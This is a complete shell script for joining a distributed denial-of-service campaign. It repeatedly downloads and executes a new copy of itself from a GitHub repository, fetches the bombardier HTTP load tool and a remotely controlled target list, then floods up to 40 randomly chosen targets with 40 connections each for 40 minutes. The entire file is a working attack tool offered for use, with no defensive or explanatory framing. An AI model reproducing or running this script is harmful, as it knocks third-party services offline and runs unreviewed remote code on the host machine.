#!/bin/sh

set -e -o errexit #-x

### Config

TIME=40m # time to work
CONNS=40 # connections per target
TOTAL=40 # maximum number of targets

### Global vars

PREFIX=/tmp/itddos
mkdir -p "$PREFIX"
TOOL="$PREFIX/bombardier"
TGT_FILE="$PREFIX/targets"
SELFUPDATE="$PREFIX/ddos.sh"

SELF_URL="https://github.com/ruskinaxuy/ddos/raw/master/ddos.sh"
TGT_URL="https://github.com/ruskinaxuy/ddos/raw/master/targets"
BOMBARM_URL="https://github.com/ruskinaxuy/ddos/raw/master/bombardier-darwin-arm64"


### Checksum calc

if [ -x "$(which md5)" ]; then
    csum() {
        cat "$1" 2>/dev/null | md5
    }
else
    csum() {
        cat "$1" 2>/dev/null | md5sum | awk '{print $1}'
    }
fi


### Self-update

if [ -z "$DISABLE_SELFUPDATE" ]; then
    SELF_CURSUM=$(csum "$0")
    curl -sLo "$SELFUPDATE" "$SELF_URL"
    SELF_NEWSUM=$(csum "$SELFUPDATE")
    if [ "$SELF_CURSUM" != "$SELF_NEWSUM" ]; then
        echo "Updating to version $SELF_NEWSUM"
        mv "$SELFUPDATE" "$0"
        exec "$0" "$@"
        exit 0
    fi
fi

### Download load testing tool

# NOTE: maybe look at wrk, but it needs to be cross-compiled

if [ ! -x "$TOOL" ]; then
    echo "Downloading bombardier..."
    case "$(uname -s)" in
        Darwin)  OS=darwin;;
        Linux)   OS=linux;;
        FreeBSD) OS=freebsd;;
        OpenBSD) OS=freebsd;;
        NetBSD)  OS=freebsd;;
        *)       OS=win.exe
    esac

    ARCH="$(uname -m)"
    CFG="${OS}-${ARCH}"

    LINK=$(curl -s https://api.github.com/repos/codesenberg/bombardier/releases/latest \
               | grep "browser_download_url.*${CFG}" \
               | cut -d : -f 2,3 \
               | tr -d \")
    if [ "${CFG}" = "darwin-arm64" ]; then
        LINK="$BOMBARM_URL"
    fi

    curl -#Lo "$TOOL" "$LINK"
    chmod +x "$TOOL"
fi


### Download targets

TGT_OLDSUM=$(csum "$TGT_FILE")
curl -sLo "$TGT_FILE" "$TGT_URL"
TGT_NEWSUM=$(csum "$TGT_FILE")

if [ "$TGT_OLDSUM" != "$TGT_NEWSUM" ]; then
    echo "Targets are updated to version $TGT_NEWSUM"
fi


### Go

ACTUAL_TARGETS=$(cat "$TGT_FILE" \
                     | grep -v '^#' \
                     | grep -v '^\s*$' \
                     | shuf -n "$TOTAL")

(trap 'kill 0' SIGINT

 while read line; do
     "$TOOL" -c "$CONNS" -d "$TIME" -l "$line" &
 done <<EOF
    $ACTUAL_TARGETS
EOF

 wait
)
